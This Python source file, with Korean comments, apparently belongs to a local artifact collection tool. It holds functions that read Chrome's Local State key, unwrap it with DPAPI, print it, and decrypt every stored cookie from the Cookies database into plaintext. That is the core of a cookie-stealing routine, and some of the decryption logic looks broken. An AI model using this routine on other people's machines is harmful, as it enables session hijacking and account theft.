import win32crypt
import base64
from Crypto.Cipher import AES
import json
import os
import sqlite3

def format_content(content):
        if isinstance(content, list):
            # 리스트인 경우 각 항목을 개별적으로 처리
            formatted_items = []
            for item in content:
                if isinstance(item, (dict, list)):
                    formatted_items.append(json.dumps(item, indent=2))
                else:
                    formatted_items.append(str(item))
            return "\n".join(formatted_items)
        elif isinstance(content, dict):
            return json.dumps(content, indent=2)
        elif isinstance(content, str):
            try:
                json_object = json.loads(content)
                return json.dumps(json_object, indent=2)
            except json.JSONDecodeError:
                # JSON 파싱 실패 시 원본 문자열 사용
                return content
        else:
            # 그 외의 경우 문자열로 변환
            return str(content)
    
def create_json_entry(file_type, file_name, file_path, content, created_time, modified_time):
    return {
        "file_type": file_type,
        "file_name": file_name,
        "file_path": file_path,
        "content": content,
        "created_time": created_time,
        "modified_time": modified_time
    }    

def extract_keys(data, keys_to_extract):
    if isinstance(data, list):
        return [
            {key: item[key] for key in keys_to_extract if key in item}
            for item in data
            if any(key in item for key in keys_to_extract)
        ]
    elif isinstance(data, dict):
        return {key: data[key] for key in keys_to_extract if key in data}
    else:
        return None

def is_directory_exist(input_data):
    appdata_path = os.environ['LOCALAPPDATA']
    parent_folder = os.path.join(appdata_path, input_data["parentDirectory"])
    
    if not os.path.exists(parent_folder):
        return None, f"{str(parent_folder)} folder not found"
    
    target_folder = os.path.join(parent_folder, input_data["targetDirectory"])
    if not os.path.exists(target_folder):
        return None, f"{str(target_folder)} folder not found"
    
    return target_folder, None

def parse_cookie_file(file_path, encryption_key):
    cookies_path = file_path + r'\Cookies'
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    
    results = []
    for host_key, name, encrypted_value in cursor.fetchall():
        decrypted = decrypt_windows_cookie(encrypted_value, encryption_key)
        results.append({
            "host_key": host_key,
            "name": name,
            "value": decrypted
        })
    conn.close()
    return results 

def decrypt_windows_cookie(encrypted_value, key):
    try:
        # DPAPI 복호화
        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
        return decrypted.decode('utf-8')
    except:
        # DPAPI 복호화 실패 시 AES 복호화 시도
        try:
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt(ciphertext)
            return plaintext.decode('utf-8')
        except:
            return None

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    return key

def read_cookie_content(file_path, max_size=1024 * 1024):
    encryption_key = get_encryption_key()
    print("Encryption key:", encryption_key.hex())

    try:
        with open(file_path, 'rb') as file:
            content = file.read(max_size)
        decrypted_content = decrypt_windows_cookie(content, encryption_key)
        return decrypted_content
    except Exception as e:
        return f"Error reading/decrypting file: {str(e)}"


def read_log_content(file_path, max_size=1024 * 1024):  # 기본적으로 1MB로 제한
    try:
        with open(file_path, 'r', encoding='utf-8', errors='replace') as file:
            file.seek(0, 2)
            file_size = file.tell()  
            if file_size > max_size:
                file.seek(-max_size, 2)  # 파일 끝에서 max_size만큼 앞으로 이동
                content = file.read()
                content = f"... (file truncated, showing last {max_size/1024:.2f}KB)\n" + content
            else:
                file.seek(0)  # 파일 시작으로 이동
                content = file.read()
        return content
    except Exception as e:
        return f"Error reading file: {str(e)}"